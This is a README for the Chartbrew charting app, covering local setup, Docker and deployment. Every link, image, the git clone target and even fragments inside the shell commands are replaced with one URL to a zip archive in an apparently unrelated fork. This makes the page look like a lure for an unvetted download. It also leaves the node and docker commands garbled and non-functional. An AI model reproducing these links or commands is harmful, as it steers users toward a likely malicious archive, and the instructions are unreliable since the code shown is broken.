<p align="center">
  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip">
    <img src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" alt="ChartBrew logo" />
  </a>
</a>

<br />

<p align="center">
  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" alt="ChartBrew build" /></a>
  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" alt="" /></a>
  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" target="_blank"><img alt="Docker Pulls" src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip"></a>
</p>

<p align="center">
  <strong>
    <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip">Chartbrew</a> is an open-source web application that can connect directly to databases and APIs and use the data to create beautiful charts. It features a chart builder, editable dashboards, embedable charts, query & requests editor, and team capabilities.
  </strong>
</p>

<p align="center" style="text-decoration: underline; text-underline-offset: 4px; text-decoration-color: #000; text-decoration-thickness: 2px;">
  <strong><a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip">Chartbrew as a service is available here</a></strong>
</p>

<br />

<p align="center">
  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip">
    <img src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" alt="ChartBrew dashboard" width="600"/>
  </a>
</p>

<hr />

📚 [**Read the full docs here**](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

💡 [**Have any ideas or discussion topics?**](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

💬 [**Join our Discord**](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

## Data sources

[Check Chartbrew's website for the latest list of supported data sources](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

## Prerequisites

* NodeJS v20
* MySQL (5+) or PostgreSQL (12.5+)
* Redis (v6+)

## Start

It is recommended you head over to the more detailed documentation to find out how to set up Chartbrew

[📚 You can find it here](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

## Set up Chartbrew locally

### Create a new database

Chartbrew can run on MySQL or PostgreSQL. Create an empty database that Chartbrew can use.

### Clone and setup

```sh
git clone https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip
cd chartbrew && npm run setup
```

Complete the required environmental variables in `https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip`. [Check out which need to be set here.](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

### Run the project in Development

Open two terminals, one for front-end and the other for back-end.

```sh
# frontend
cd client/
npm run start

# backend
cd server/
npm run start-dev
```

Head over to `http://localhost:4018` to see the app running and create your first user account.

## Deploy Chartbrew on Render

[![Deploy to Render](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

## Deploy Chartbrew on Heroku and Vercel

[Read more on how to do this here](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

## Run with Docker

[Check the full guide in the docs.](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)

### Quickstart

A [Chartbrew docker image](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip) is built whenever a new version is released.

Before running the commands below, make sure you have a MySQL server already running and an empty database that Chartbrew can use. The database name should match the value of the `CB_DB_NAME` variable.

You will need a 32 bytes AES encryption key for the `CB_ENCRYPTION_KEY` variable. Run the following command to generate one:

```sh
node -e "https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip(require('crypto').randomBytes(32).toString('hex'))"
```

```sh
docker pull razvanilin/chartbrew

docker run -p 4019:4019 -p 4018:4018 \
  -e CB_ENCRYPTION_KEY=your_32_bytes_key \
  -e CB_API_HOST=0.0.0.0 \
  -e CB_API_PORT=4019 \
  -e https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip \
  -e CB_DB_PORT=3306 \
  -e CB_DB_NAME=chartbrew \
  -e CB_DB_USERNAME=root \
  -e CB_DB_PASSWORD=password \
  -e https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip \
  -e CB_REDIS_PORT=6379 \
  -e CB_REDIS_PASSWORD=password \
  -e VITE_APP_CLIENT_HOST=http://localhost:4018 \
  -e VITE_APP_CLIENT_PORT=4018 \
  -e VITE_APP_API_HOST=http://localhost:4019 \
  razvanilin/chartbrew
```

## Acknowledgements

Many thanks to [everybody that contributed](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip) to this open-source project 🙏

[Start here if you want to become a contributor](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
